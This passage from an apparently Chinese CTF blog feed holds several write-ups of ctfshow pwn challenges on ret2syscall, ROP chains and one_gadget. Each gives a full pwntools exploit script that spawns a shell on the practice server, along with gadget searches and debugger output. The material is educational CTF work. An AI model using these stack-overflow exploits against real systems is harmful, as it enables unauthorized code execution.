<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28110</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span>+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>因为flag在文件&#x2F;flag里，所以这里我们就使用cat，当然也可以使用ORW</li>
<li><code>\x00\xc0</code>是<code>ADD AL,AL</code>的意思，是程序中出现的代码</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn71</title>
    <url>/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/</url>
    <content><![CDATA[<h2 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h2><p><a href="https://ctf.show/challenges#pwn71-4081">ctf.show pwn71</a></p>
<span id="more"></span>

<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>题目描述是 <strong>ret2syscall</strong></p>
<p><strong>ret2syscall原理：</strong></p>
<p>利用 <strong>系统调用</strong>去进行攻击，核心思想是：<strong>控制寄存器+ 跳转syscall</strong></p>
<p>在栈溢出时，我们能控制栈，因此可以构造 <strong>ROP链</strong></p>
<p>**32-bit ret2syscall：**eax &#x2F; ebx &#x2F; ecx &#x2F; edx</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">eax = <span class="string">&quot;系统调用号&quot;</span></span><br><span class="line">ebx = <span class="string">&quot;参数1&quot;</span></span><br><span class="line">ecx = <span class="string">&quot;参数2&quot;</span></span><br><span class="line">edx = <span class="string">&quot;参数3&quot;</span></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>**64-bit ret2syscall：**rax &#x2F; rdi &#x2F; rsi &#x2F; rdx</p>
<p>一句话概括：利用栈溢出构造ROP链执行系统调用</p>
<hr>
<p>知道原理之后我们就可以去写题了</p>
<p>先<code>checksec ./pwn</code>看一下保护机制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn71$ checksec ./pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/yyh/pwn71/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>发现 <strong>NX</strong> 开启，即不可执行，我们可以使用 <strong>syscall</strong> 进行绕过，因为syscall是利用<strong>gadget</strong> 来进行系统调用的</p>
<p>我们先使用Ida看一下程序的代码<br><strong>main函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===============CTFshow--PWN===============&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to use ret2syscall!&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的栈溢出<code> gets(&amp;v4);</code></p>
<p>我们先看需要 <strong>填充</strong> 的偏移是多少</p>
<ol>
<li><p>我第一次是在ida中看的,<code>int v4; // [esp+1Ch] [ebp-64h] BYREF</code></p>
<p>那么offset &#x3D; 0x64 + 4吗?其实不是的，我是写好exp之后发现打不通，才发现这个offset是不对的</p>
</li>
<li><p>我们可以使用<code>cyclic</code>来看偏移，这是更准确的方法</p>
<p><strong>具体操作：</strong></p>
<ol>
<li><p>gdb .&#x2F;pwn</p>
</li>
<li><p>b main</p>
</li>
<li><p>r</p>
</li>
<li><p>cyclic 200</p>
</li>
<li><p>复制下来这串字符之后</p>
</li>
<li><p>Ctrl + d退出调试</p>
</li>
<li><p>gdb .&#x2F;pwn</p>
</li>
<li><p>r</p>
</li>
<li><p>输入这串字符</p>
</li>
<li><p>得到溢出地址</p>
</li>
<li><p>cyclic -l 0x62616164</p>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/5.png" class="" title="This is an image"></li>
</ol>
<p>之后我们就得到了偏移地址是<strong>112</strong></p>
</li>
</ol>
<blockquote>
<p>我们怎么构造ROP链？</p>
</blockquote>
<p>首先<code>execve</code>的系统调用号是<strong>11 (0xb)</strong></p>
<p>那么如果要执行 <strong>“&#x2F;bin&#x2F;sh”</strong> 的话</p>
<ul>
<li><code>eax = 11 (0xb)</code>   -&gt;   <code>execve</code>的系统编号</li>
<li><code>ebx = &quot;/bin/sh&quot;</code>   -&gt;   文件名</li>
<li><code>ecx = 0</code></li>
<li><code>edx = 0</code></li>
<li><code>int 0x80</code></li>
</ul>
<p>Q：<code>int 80</code> 的意思是什么？<br>A：触发中断 0x80，让 CPU 从用户态切换到内核态执行系统调用。</p>
<p>​	当然如果我们需要执行这个命令的话就需要寄存器传参，就需要找 <code>gadget</code> 的地址</p>
<p>可以使用<code>ROPgadget</code>命令来找我们所需要的地址</p>
<ol>
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep eax</code></li>
</ol>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/2.png" class="" title="This is an image">

<ol start="2">
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ebx</code></li>
</ol>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/3.png" class="" title="This is an image">

<ol start="3">
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ecx</code></li>
</ol>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn71/4.png" class="" title="This is an image">

<p>到<code>ecx</code>发现并没有<code>pop ecx ; ret</code></p>
<p>但是我们发现了<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code> </p>
<p>这个gadget同样可以使用，并且<strong>它正好按顺序帮我设置了 execve 所需的三个寄存器</strong></p>
<blockquote>
<p>exp如下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28108</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x64</span></span><br><span class="line"><span class="comment">#eax = 11</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edx = 0, ecx = 0, ecx = &quot;/bin/sh&quot;</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#edx</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#ecx</span></span><br><span class="line">payload += p32(binsh) <span class="comment">#ebx = &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#int 0x80</span></span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题到此就结束了</p>
<p>加油！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn72</title>
    <url>/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/</url>
    <content><![CDATA[<h2 id="pwn72"><a href="#pwn72" class="headerlink" title="pwn72"></a>pwn72</h2><p><a href="https://ctf.show/challenges#pwn72-4082">ctf.show pwn72</a></p>
<span id="more"></span>

<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>我们先<code>checksec ./pwn</code>查看程序的保护机制</p>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/2.png" class="" title="This is an image">

<p>开启了<code>NX</code>不可执行机制，我们可以使用gadget构造payload来写这道题</p>
<p>查看 <strong>main函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+10h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-PWN&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is my system?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Emmm&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gets(&amp;v4);</code>依旧是很明显的栈溢出漏洞</p>
<p>那么我们先看一下程序的 <strong>偏移</strong> 是多少</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6161616c</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;laaa&#x27;</span> (hex: 0x6c616161)</span><br><span class="line">Found at offset 44</span><br></pre></td></tr></table></figure>

<p>如果你不知道<strong>cyclic</strong>怎么使用，建议看一下pwn71这篇，或者自己去搜索一篇好的博客学习一下</p>
<p>看看程序中有没有<code>&quot;/bin/sh&quot;</code></p>
<p>使用<code>ROPgadget --binary pwn --string &quot;/bin/sh&quot;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ROPgadget --binary pwn --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显没有”&#x2F;bin&#x2F;sh”，那么如果我们想使用syscall来写这道题的话，execve(“&#x2F;bin&#x2F;sh”)是一定会构造的，那没有<code>&quot;/bin/sh&quot;</code>怎么能行？</p>
<p>我们可以进行两个系统调用：</p>
<ul>
<li>read(fd,addr,len)</li>
<li>execve(“&#x2F;bin&#x2F;sh”,0,0)</li>
</ul>
<p>为了解决<code>&quot;/bin/sh&quot;</code>这个问题，我们可以使用read来将<code>&quot;/bin/sh&quot;</code>写入。但是想用系统调用，我们需要找一些我们能用的<code>gadget片段</code>。</p>
<ul>
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep eax</code></li>
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ebx</code></li>
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ecx</code></li>
<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep edx</code></li>
</ul>
<p>但是当我找<code>ecx</code>寄存器的时候，我发现，如果想要单独的<code>pop ecx; ret</code></p>
<p>是找不到的，但是我找到了另一个可以用的</p>
<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/3.png" class="" title="This is an image">

<p>如果使用这条gadget，那我们直接使用这一条+eax那一条就够用了，非常方便</p>
<p>通过这些命令，找到gadget的地址为：</p>
<ul>
<li><code>eax：</code>0x080bb2c6</li>
<li><code>edx_ecx_ebx：</code>0x0806ecb0</li>
</ul>
<p>除此之外我们还需要<code>int 0x80; ret</code>的地址</p>
<p><strong>需要注意为什么这里要加ret，但是上一题不需要加ret：</strong></p>
<ul>
<li>在pwn71这道题目中我们直接使用<code>int 0x80</code>就可以了，是因为我们使用的是execve系统调用，<strong>execve 成功后不会返回用户态</strong>，执行流直接跳到新进程（&#x2F;bin&#x2F;sh）</li>
<li>而在pwn72本道题中，我们需要使用<code>int 0x80; ret</code>，read 系统调用执行完后，CPU 会从你构造的 syscall 指令<strong>紧接着的地址继续执行</strong>，如果你只放 <code>int 0x80</code>，那系统调用之后 CPU 会跑到 <strong>你无法控制的下一条指令</strong>，所以你必须让它执行到一个受控“ret”，回到 ROP 链继续执行</li>
<li>除了execve 和 exit可以直接使用<code>int 0x80</code>其他的系统调用都要使用<code>int 0x80; ret</code></li>
</ul>
<p>我们使用命令来查找该gadget</p>
<ol>
<li><p><code>ROPgadget --binary pwn --only &quot;int&quot;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ROPgadget --binary pwn --only <span class="string">&quot;int&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080891d5 : int 0xcf</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure>

<p>这个里并没有符合我们要求的地址。</p>
<p>我一瞬间不知道怎么做了，去问了群里的大佬，才知道还有一个命令<code>poper</code>找的更全</p>
</li>
<li><p><code>ropper --file pwn --search &quot;int 0x80&quot;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ropper --file pwn --search <span class="string">&quot;int 0x80&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: pwn</span><br><span class="line">0x08049421: int 0x80; </span><br><span class="line">0x0806f350: int 0x80; ret; </span><br></pre></td></tr></table></figure>

<p>找到了！！！！</p>
</li>
</ol>
<p><strong>int 0x80; ret;</strong> 的地址是：<code>0x0806f350</code></p>
<p>我们先解决 <strong>read</strong> 这个系统调用的payload</p>
<p>再调用之前，我们还需要知道”&#x2F;bin&#x2F;sh”写入哪一个段地址中，这就需要使用<code>vmmap</code>命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">     Start        End Perm     Size  Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x80e9000 r-xp    a1000       0 pwn</span><br><span class="line"> 0x80e9000  0x80eb000 rw-p     2000   a0000 pwn</span><br><span class="line"> 0x80eb000  0x80ed000 rw-p     2000       0 [anon_080eb]</span><br><span class="line"> 0x80ed000  0x810f000 rw-p    22000       0 [heap]</span><br><span class="line">0xf7ff8000 0xf7ffa000 r--p     2000       0 [vvar]</span><br><span class="line">0xf7ffa000 0xf7ffc000 r--p     2000       0 [vvar_vclock]</span><br><span class="line">0xf7ffc000 0xf7ffe000 r-xp     2000       0 [vdso]</span><br><span class="line">0xfffdd000 0xffffe000 rw-p    21000       0 [stack]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x80e9000  0x80eb000 rw-p     2000   a0000 pwn</span><br><span class="line"> 0x80eb000  0x80ed000 rw-p     2000       0 [anon_080eb]</span><br><span class="line"> 0x80ed000  0x810f000 rw-p    22000       0 [heap]</span><br></pre></td></tr></table></figure>

<p>这三个段地址都是可写的，我们可以随意选择一个地址（bss），作为填写<code>/bin/sh</code>的地址</p>
<ul>
<li><p>read(fd , addr , len)</p>
<p>因为我们是从stdin中输入”&#x2F;bin&#x2F;sh”的，所以我们的fd就应该等于0</p>
<p>那么addr就应该是我们写入”&#x2F;bin&#x2F;sh”段的地址</p>
<p>如果我们值写入”&#x2F;bin&#x2F;sh”的话，8是够的，或者你可以更长</p>
</li>
<li><p>execve(“&#x2F;bin&#x2F;sh”,0,0)</p>
<p>只不过因为我们的<code>&quot;/bin/sh&quot;</code>写到bss里面了，那么第一个参数就是bss的地址</p>
</li>
</ul>
<p><strong>exp如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28137</span>)</span><br><span class="line">eax = <span class="number">0x080bb2c6</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806ecb0</span></span><br><span class="line">bss = <span class="number">0x80ea000</span></span><br><span class="line">int_0x80 = <span class="number">0x0806F350</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">44</span> * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload += p32(eax)</span><br><span class="line">payload += p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">payload += p32(eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">binsh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">p.sendline(binsh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn74</title>
    <url>/2025/11/29/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn74/</url>
    <content><![CDATA[<h2 id="pwn74"><a href="#pwn74" class="headerlink" title="pwn74"></a>pwn74</h2><p><a href="https://ctf.show/challenges#pwn74-4084">ctf.show pwn74</a></p>
<span id="more"></span>

<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id='jump1'>题目</a></h4><img src="/2025/11/29/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn74/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id='jump2'>预计时间</a></h4><p>2h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id='jump3'>题目分析及截图</a></h4><p><strong>one_gadget：</strong></p>
<p>​	开始解题之前，我们需要知道 <strong>one_gadget</strong> 是什么工具，它的作用是什么，我们什么时候用？</p>
<ul>
<li><strong>one_gadget</strong> 是一个用于扫描 <strong>libc文件</strong> ，找到可以执行<code>execve(&quot;/bin/sh&quot;，null,null)</code>的gadget地址的工具</li>
<li>它的作用就是帮助我们直接拿到一个可能出shell的地址，而不必手动构造完整ROP链。</li>
<li>当我们知道本题的libc版本，或者题目给我们了libc版本，那么我们就可以使用这个工具，如果这些<code>execvee(&quot;/bin/sh&quot;,null,null)</code>的其中一个的前提条件都满足，我们就可以使用这个地址</li>
</ul>
<p><strong>安装方式：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt -y install ruby</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure>

<p><strong>使用方式：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<hr>
<p>接下来我们看这道题怎么解</p>
<p>使用ida看函数的反编译代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">2</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;    鈻勨杽鈻勨杽   鈻勨杽鈻勨杽鈻勨杽鈻勨杽  鈻勨杽鈻勨杽鈻勨杽鈻勨杽            鈻勨杽                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A80);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; 鈻堚枅鈻€          鈻堚枅     鈻堚枅        鈻勨杽鈻堚枅鈻堚枅鈻堚杽  鈻堚枅鈻勨枅鈻堚枅鈻堚杽   鈻勨枅鈻堚枅鈻堚杽  鈻堚枅      鈻堚枅&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CA8);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;    鈻€鈻€鈻€鈻€      鈻€鈻€     鈻€鈻€         鈻€鈻€鈻€鈻€鈻€鈻€   鈻€鈻€    鈻€鈻€    鈻€鈻€鈻€鈻€     鈻€鈻€  鈻€鈻€  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : PWN_Tricks                                              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Use one_gadget a shuttle!                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p ?\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v4);</span><br><span class="line">  v4[<span class="number">1</span>] = v4[<span class="number">0</span>];</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v4[<span class="number">0</span>])();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>在<code> printf(&quot;What&#39;s this:%p ?\n&quot;, &amp;printf);</code>中程序会输出<code>printf</code>的地址</li>
</ul>
<p>​	使用用户输入来获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极有可能会带来安全隐患，因为恶意用户可以输入不安全的函数指针，导致程序出现问题。</p>
<p>​	我们使用<code> one_gadget</code>来看看我们有没有可以用的<code>execve(&quot;/bin/sh&quot;)</code>调用</p>
<p>​	因为使用libc是需要和题目一致的，我的虚拟机并不是使用的附带的虚拟机，我就只下载了libc文件放在了和程序一样的目录下，然后使用<code>one_gadget ./libc.so.6</code>就可以看到程序有哪些可以用的gadget地址，或者你也可以自己泄露，因为这里我也是猜的，没有什么依据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn74$ one_gadget ./libc.so.6</span><br><span class="line">0x4f29e execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x50 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, <span class="string">&quot;-c&quot;</span>, r12, NULL&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x4f2a5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x50 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, rax, r12, NULL&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x4f302 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL || &#123;[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x10a2fc execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span><br></pre></td></tr></table></figure>

<p>一个一个去试这些地址</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28159</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a2fc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">print_libc = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base = (printf - print_libc)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(one_gadget+base))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>即可得到flag</p>
<p>​	</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2025长城杯 wasm-login</title>
    <url>/2026/01/05/2025%E9%95%BF%E5%9F%8E%E6%9D%AF-wasm-login/</url>
    <content><![CDATA[<h2 id="wasm-login"><a href="#wasm-login" class="headerlink" title="wasm-login"></a>wasm-login</h2><h4 id="长城杯逆向题目-wasm-login"><a href="#长城杯逆向题目-wasm-login" class="headerlink" title="长城杯逆向题目-wasm-login"></a><a href="">长城杯逆向题目-wasm-login</a></h4><span id="more"></span>

<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
<li><a href="#1">刚开始写题的想法</a></li>
<li><a href="2">题解</a></li>
<li><a href="3">总结与反思</a></li>
<li><a href="4">相关知识点</a></li>
</ul>
<hr>
